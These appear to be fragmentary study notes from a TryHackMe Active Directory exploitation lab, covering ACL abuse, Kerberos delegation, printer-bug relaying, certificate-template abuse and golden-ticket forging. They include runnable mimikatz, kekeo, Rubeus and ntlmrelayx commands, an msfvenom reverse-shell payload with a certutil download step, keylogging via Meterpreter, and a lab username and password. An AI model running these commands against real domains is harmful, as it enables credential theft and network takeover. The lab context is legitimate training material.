## Table of Contents

    - [Exploiting Permission delegation](#Exploiting\Permission\delegation)
  - [Exploiting Kerberos Delegation](#Exploiting\Kerberos\Delegation)
  - [Resource-based Constrained Delegation](#Resource-based\Constrained\Delegation)
      - [Constrained Delegation Exploitation](#Constrained\Delegation\Exploitation)
- [Exploiting Automated Relays](#exploiting\automated\relays)

```
thmchilddc - 10.200.60.101
Username: vanessa.austin Password: Milfhunter1973

CN=t2_june.russell,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc 
name              : t2_june.russell
objectClass       : user
objectGUID        : e9b91021-2cb4-4a81-bf09-13a24393ffb7
SamAccountName    : t2_june.russell 
SID               : S-1-5-21-3885271727-2693558621-2658995185-4407
```
### Exploiting Permission delegation
Active Directory can delegate permissions and privileges through a feature called Permission Delegation (not to be confused with Kerberos Delegation that will be discussed in the next task). Delegation is what makes AD so powerful in organisations. Imagine we work for an organisation that has 50000 employees. Since we care about security, we only have three users that have access to DA credentials. It would be impossible for those three users to field all requests from the users, such as resetting their passwords. Using Delegation, we can delegate the permission to force change a user's password to the Helpdesk team, meaning they now have a delegated privilege for this specific function. In principle, to keep Delegation secure, the principle of least privilege should be followed. However, in large organisations, this is easier said than done. In this task we will look at exploiting some Delegation misconfigurations.

**Permission Delegation~**
Permission Delegation exploits are often referred to as ACL-based attacks. AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object.

However, if these ACEs are misconfigured, it may be possible for an attacker to exploit them. Let's look at our example again. If the IT Support team were granted the ForceChangePassword ACE over the Domain Users group, this would be considered insecure. Sure they would be able to reset the passwords of employees that forgot their passwords, but this misconfiguration would allow them to also reset the passwords of privileged accounts, such as the accounts that are members of the Domain Admins group essentially allowing for privilege escalation.


**Exploiting ACEs**
A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited. However, we will look at a couple of notable ones here:

- **ForceChangePassword:** We have the ability to set the user's current password without knowing their current password.
- **AddMembers:** We have the ability to add users (including our own account), groups or computers to the target group.
- **GenericAll:** We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- **GenericWrite:** We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- **WriteOwner:** We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- **WriteDACL:** We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- **AllExtendedRights:** We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) PowerShell cmdlets or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit). Depending on the breach and the detection tools in the environment, one option may be stealthier. In this task we will show both.


bloodhound~
Sharphound has already been executed for you and attached as a task file. start Bloodhound on the attackbox/kali machine and ingest the data. you are, however, welcome to rerun sharphound. 

## Exploiting Kerberos Delegation
kerberos delegation~ 
However, we can allow this service account to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.

**Constrained vs Unconstrained~**
There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method. In essence, unconstrained delegation provides no limits to the delegation. In the background, if a user with the :TRUSTED_FOR_DELEGATION" flag set authenticates to a host with unconstrained delegation configured, a ticket-granting-ticket(TGT) for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service. If you want to see an example of the exploitation of Unconstrained Delegation, have a look [here](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976).


To combat the security failings of Unconstrained Delegation, Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. The following are examples of services that can be configured for delegation:

- **HTTP** - Used for web applications to allow pass-through authentication using AD credentials.  
    
- **CIFS** - Common Internet File System is used for file sharing that allows delegation of users to shares.  
    
- **LDAP** - Used to delegate to the LDAP service for actions such as resetting a user's password.  
    
- **HOST** - Allows delegation of account for all activities on the host.  
    
- **MSSQL** - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.  
    

Exploiting Constrained Delegation is usually more complex than exploiting Unconstrained Delegation since the delegated account can't just be used for everything. However, it can still be used for some powerful exploitation. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate a TGT for this account, then use the TGT to execute a ticket-granting server (TGS) request for any non-sensitive user account in order to access the service as that user. Imagine impersonating an account with access to a sensitive database, for example.


## Resource-based Constrained Delegation
o there are actually three types of Kerberos Delegation. But this one deserves to be mentioned on its own. Introduced by Microsoft in 2012, Resource-Based Constrained Delegation (RBCD) once again provided additional restrictions on Kerberos Delegation for security. RBCD changes the delegation model entirely. Instead of specifying which object can delegate to which service, the service now specifies which objects can delegate to it. This allows the service owner to control who can access it. In our web application example, this means that instead of specifying that the web service account can delegate to the database service to access the database, we can now specify that on the database service that the web service account is allowed to delegate access to it.

Let's say that we have permission to configure RBCD for a service. This means we have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute for the AD Object. We can populate this attribute with the details of an AD account that we have access to. To now gain access to the service, we can generate a TGT for the account we control, which will allow us to interact with this service. If you want a detailed example of RBCD exploitation, take a look [here](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/).

#### Constrained Delegation Exploitation
PowerShell

```shell-session
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```
Based on the output of this command, we can see that the svcIIS account can delegate the HTTP and WSMAN services on THMSERVER1. You would think that this means we can only access websites on behalf of impersonated users. However, PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal option would be to impersonate a Tier 1 Admin since this would provide us with administrative access over THMSERVER1.

If you were to perform proper post-exploitation enumeration of THMWRK1, you would find that there is a service on the host running as the svcIIS user. Since we have administrative access now, we can use this to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services. Let's use [Mimikatz](https://github.com/gentilkiwi/mimikatz/security) to dump the secrets:

```bash
mimikatz # token::elevate

mimikatz # lsadump::secrets
```
- `token::elevate` - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
- `lsadump::secrets` - Mimikatz interacts with the registry hive to pull the clear text credentials.

```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe ___ _ kekeo 2.1 (x64) built on Dec 14 2021 11:51:55 / ('>- "A La Vie, A L'Amour" | K | /* * * \____/ Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) L\_ https://blog.gentilkiwi.com/kekeo (oe.eo) with 10 modules * * */ kekeo #
```
We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:
```
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted
```
# Exploiting Automated Relays
In this task we will take a look at some automated relays. Authentication attempts are constantly flying across the network, and as shown in the Breaching AD room, if we are lucky, we can intercept some of these challenges to gain access. But what if we don't like to wait? What if we can coerce authentication to occur?

Although we already have privileged access to THMSERVER1, we could be in a position where we did not have access to a constrained delegation exploit. This is another excellent attack that can be performed to gain privileged access to hosts.

**Machine Accounts**
All windows hosts have a machine account. Essentially, this is the user account associated with the machine. Unless someone tampered with the account of the host, the passwords of these accounts are uncrackable. By defualt, they are 120 characters *UTF16) long and are automatically rotated every 30 days. 


In AD, these machine accounts are used quite a bit in different services. Different domain controllers use their machine accounts to synchronise AD updates and changes. When you request a certificate on behalf of the host you are working on, the machine account of that host is used for authentication to the AD Certificate Service.

There is an exceptional case in AD, where one machine has admin rights over another machine. Essentially in the AD configuration, administrative permissions over a host have been granted to another host. Again, this is expected functionality such as domain controllers or SQL clusters that must be synchronised. However, these instances provide a very interesting attack vector for coercing authentication.

We first need to identify cases where a machine account has administrative access over another machine. We can use Bloodhound for this, but it means we will have to write some custom cypher queries. Click the "Create Custom Query" in the Analysis tab in Bloodhound:

```
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```
This query will attempt to find instances where a computer has the "AdminTo" relationship over another computer. You hsould see output similar to this:
This is very interesting. It shows us that the THMSERVER2 machine account has administrative privileges over the THMSERVER1 machine.

**The Printer Bug**

_It's not a bug, it's a feature - Microsoft._

Seriously, when this was reported, Microsoft responded that this was a feature. The printer bug is a "feature" of the MS-RPRN protocol (PrintSystem Remote Protocol), which allows a domain user to remotely force a target host running the Print Spooler service to authenticate to an arbitrary IP address. There have been a few of these bugs in recent years: Spooler, PetitPotam, PrintNightmare. Microsoft claims that the only bug is that some of these did not require AD credentials at all, but this issue has been resolved through security patches.  

Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the following four conditions :

1. A valid set of AD account credentials.
2. Network connectivity to the target's SMB service.
3. The target host must be running the Print Spooler service.
4. The hosts must not have SMB signing enforced.  
    

Condition **1 and 2** have been met already. The only two we need to ensure works are conditions 3 and 4.

**Print Spooler Service**

We need to determine if the Print Spooler service is running. Since we don't have access to THMSERVER2, we need to query from the network perspective. In this case, we can use a WMI query from our SSH session on THMWRK1 to query the service's current state:



The output from the cmdlet verifies that the service is running. If we get an access denied error, you could perhaps attempt the PowerShell command of `Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`. However, Microsoft has been cracking down viewing these ports from the network's perspective. If both give you an error, you may just need to take a leap of faith. Thus, condition three has been met.

**SMB Signing**

In order to relay the coerced authentication attempt, SMB signing should not be enforced. It should be noted that there is a difference between SMB signing being allowed and SMB signing being enforced. Since some legacy systems do not support SMB signing, by default, the configuration of SMB is that signing is allowed but not enforced, meaning that it will only be used if supported. Since we will be hosting a malicious SMB server, we can ensure our server does not support signing, forcing the target not to sign the SMB authentication attempt.

To verify that THMSERVER1 and THMSERVER2 do not have SMB signing enforced, we can use Nmap on our AttackBox:

```shell-session
thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
```

We will be using [SpoolSample](https://github.com/leechristensen/SpoolSample) to exploit the authentication relay. It is a C# exploit but has already been compiled for you and stored in the `C:\Tools\` directory on THMWRK1.  We will use Spoolsample.exe to coerce THMSERVER2 to authenticate to us on our AttackBox and then [Impacket](https://github.com/SecureAuthCorp/impacket)'s [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to relay the authentication attempt THMSERVER1. Note that if you are using your own VM, you will need to make sure you have the updated version of Impacket that supports SMBv2.  

The first step is to set up the NTLM relay. On our AttackBox, we can use the following:
Terminal

```shell-session
thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
```

SYSTEM is Sometimes Too Privileged  

Meterpreter has a built-in keylogger. This will be useful for extracting the user's keystrokes. However, we can't just start this keylogger and hope for the best since our shell is currently running in the SYSTEM context. SYSTEM won't be typing any keystrokes, so this won't help us. To capture the correct user's credentials, we will need to ensure that our shell is running in the context of that user.

Fortunately, Meterpreter provides us with a migrate feature, and since we are running as SYSTEM, we should be able to migrate to any process. You have remote code execution on THMSERVER1, use this to get a Meterpreter shell. If you need a recap on using Meterpreter and Metasploit, [here is a module on its use.](https://tryhackme.com/module/metasploit) However for a quick rundown, you can use the following command to generate a PowerShell meterpreter payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=6969 -f psh -0 shell.ps1
```

You can then also use the following to create the associated listener in the msfconsole:
```
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"
```
Then host the meterpreter shell using a python webserver, and copy it using a command such as:
```
certutil.exe -urlcache -split -f http://MACHINE_IP/shell.ps1
```


Once you have a meterpreter shell, you can continue. The first step is to see if the users have any running processes on this machine:

```shell-session
meterpreter\>ps | grep "explorer"
```

1. Reset the password of the trevor.local user using the following command: `net user trevor.local <chosen password>`

 in. Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves. These templates have parameters that say which user can request the certificate and what is required. SpecterOps found that specific combinations of these parameters can be incredibly toxic and abused for privilege escalation and persistent access.

Before we dive deeper into certificate abuse, some terminology:

- PKI - Public Key Infrastructure is a system that manages certificates and public key encryption  
    
- AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
- CA - Certificate Authority is a PKI that issues certificates  
- Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA
- CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate
- EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used

In order to find vulnerable templates, we will use Window's built-in tool certutil. Using our RDP access on THMSERVER2, we can run the following Powershell script to enumerate certificates:

```shell-session
C:\>certutil -Template -v > templates.txt
```


Using RDP access on THMSERVER2, we will now request our certificate. If you use Remmina and save the config of the RDP connection, please make sure to disable **Restricted admin mode**. We will use the Microsoft Management Console (MMC):

1. Click **Start**->**run**
2. Type **mmc** and hit enter
3. Click **File**->**Add/Remove Snap-in..**
4. Add the **Certificates** snap-in and make sure to select **Computer Account** and **Local computer** on the prompts.
5. Click **OK**

You should now see the Certificate snap-in:

![MMC Certificates](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/4304fb96c8fc796a4e26801843abcd6c.png)

We will request a personal certificate:

1. Right Click on **Personal** and select **All Tasks**->**Request New Certificate...**
2. Click **Next** twice to select the AD enrollment policy.
3. You will see that we have one template that we can request, but first, we need to provide additional information.
4. Click on the **More Information** warning.
5. Change the **Subject name Type** option to **Common Name** and provide any value, since it does not matter, and click **Add**.
6. Change the **Alternative name Type** option to **User principal name**.
7. Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click **Add.**

Your additional information should look something like this:



The last step is to export our certificate with the private key:
1. Right-click on the certificate and select **All Tasks**->**Export...**
2. Click **Next**, select **Yes, export the private key**, and click **Next**.
3. Click **Next**, then set a password for the certificate since the private key cannot be exported without a password.
4. Click **Next** and select a location to store the certificate.
5. Click **Next** and finally click **Finish.**

User Impersonation through a Certificate

Now we can finally impersonate a user. To perform this, two steps are required:

- Use the certificate to request a Kerberos ticket-granting ticket (TGT)  
    
- Load the Kerberos TGT into your hacking platform of choice

For the first step, we will be using [Rubeus](https://github.com/GhostPack/Rubeus). An already compiled version is available in the `C:\Tools\` directory. Open a command prompt window and navigate to this directory. We will use the following command to request the TGT:

`Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>`

Let's break down the parameters:

- **/user** - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
- **/enctype** -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
- **/certificate** - Path to the certificate we have generated
- **/password** - The password for our certificate file
- **/outfile** - The file where our TGT will be output to
- **/domain** - The FQDN of the domain we are currently attacking
- **/dc** - The IP of the domain controller which we are requesting the TGT from. Usually it is best to select a DC that has a CA service running

Once we execute the command, should receive our TGT~
```C:\THMTools> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101```

Now we can use Mimikatz to load the TGT and authenticate to THMDC:  
```
mimikatz # privilege::debug 
Privilege '20' OK 
mimikatz # kerberos::ptt administrator.kirbi
* File: 'administrator.kirbi': OK mimikatz # exit Bye! C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\ Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows Volume Serial Number is 1634-22A9 Directory of \\THMDC.za.tryhackme.loc\c$ 01/04/2022 08:47 AM 103 delete-vagrant-user.ps1 04/30/2022 10:24 AM 154 dns_entries.csv 04/27/2022 10:53 PM 885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin 09/15/2018 08:19 AM <DIR> PerfLogs 03/21/2020 09:31 PM <DIR> Program Files 03/21/2020 09:28 PM <DIR> Program Files (x86) 04/27/2022 08:27 AM 1,423 thm-network-setup-dc.ps1 04/25/2022 07:13 PM <DIR> tmp 04/27/2022 08:22 AM <DIR> Users 04/25/2022 07:11 PM <SYMLINKD> vagrant [\\vboxsvr\vagrant] 04/27/2022 08:12 PM <DIR> Windows 7 File(s) 2,356,811 bytes 7 Dir(s) 50,914,541,568 bytes free
```
**Domain Trusts**

As discussed in the [AD Basics room](https://tryhackme.com/jr/activedirectorybasics), a forest is a collection of one or more domain trees inside an AD network. Domain Trusts are a mechanism for users in the network to gain access to other resources in the domain. For the most part, trusts outline how the domains inside of a forest communicate with each other. In some environments, trusts can be extended out to external domains and even forests in some cases.

There are two main types of trusts that can be configured between domains:

- Directional - The direction of the trust flows from a trusting domain to a trusted domain
- Transitive - The trust relationship expands beyond just two domains to include other trusted domains

Its common to have a root or parent domain in a forect. In ourcase this is tryhackme.loc. For each regional office, sub or child domains are created, such as za.tryhackme.loc or UK.tryhackme.loc. 


However, what if we want to generate our own TGTs to grant us access to everything? This is known as a Golden Ticket attack. In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:

- The FQDN of the domain
- The Security Identifier (SID) of the domain
- The username of the account we want to impersonate
- The KRBTGT password hash

The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Luckily for us, we have just compromised the Tier 0 admins group with a forged certificate, so we are in a position to recover the KRBTGT password hash.

We will again use Mimikatz with a DC Sync to recover the KRBTGT password hash on THMSERVER2

To recover these SIDs, we can use the AD-RSAT Powershell cmdlets. We can recover the SID of the child domain controller using the following command:

```shell-session
PS C:\> Get-ADComputer -Identity "THMDC"
```

We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:  

```shell-session
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
```

Exploiting Domain Trusts

We finally have all of the information required to create our forged TGT. We will use Mimikatz to generate this golden ticket. The command will look something like this:
```
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
```

First, we will verify that this ticket works for access to THMDC since it is a valid ticket for the Administrator user of the child domain:

```shell-session
C:\>dir \\thmdc.za.tryhackme.loc\c$
```
This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:

```shell-session
C:\>dir \\thmrootdc.tryhackme.loc\c$\
```

































